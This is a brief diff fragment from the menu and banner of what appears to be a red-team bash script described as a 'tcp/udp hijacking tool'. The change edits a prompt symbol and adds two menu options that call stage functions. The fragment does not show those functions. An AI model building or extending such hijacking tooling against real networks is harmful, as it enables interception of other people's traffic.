 echo "${YellowF}                                                       SSA_${RedF}RedTeam${YellowF}©2016${BlueF}_⌋${Reset}"
 echo ${BlueF}[☠]${white} tcp/udp hijacking tool${RedF}! ${Reset};
 sleep 1
-echo ${BlueF}[➽]${white} Chose Your Option[filter]${RedF}: ${Reset};
+echo ${BlueF}[▶]${white} Chose Your Option[filter]${RedF}: ${Reset};
 echo -n "$PrompT"
 read choice
 case $choice in
@@ -1471,6 +1727,8 @@ case $choice in
 7) sh_stage7 ;;
 8) sh_stage8 ;;
 9) sh_stage9 ;;
+10) sh_stage10 ;;
+11) sh_stage11 ;;
 W) sh_stageW ;;
 w) sh_stageW ;;
 S) sh_stageS ;;
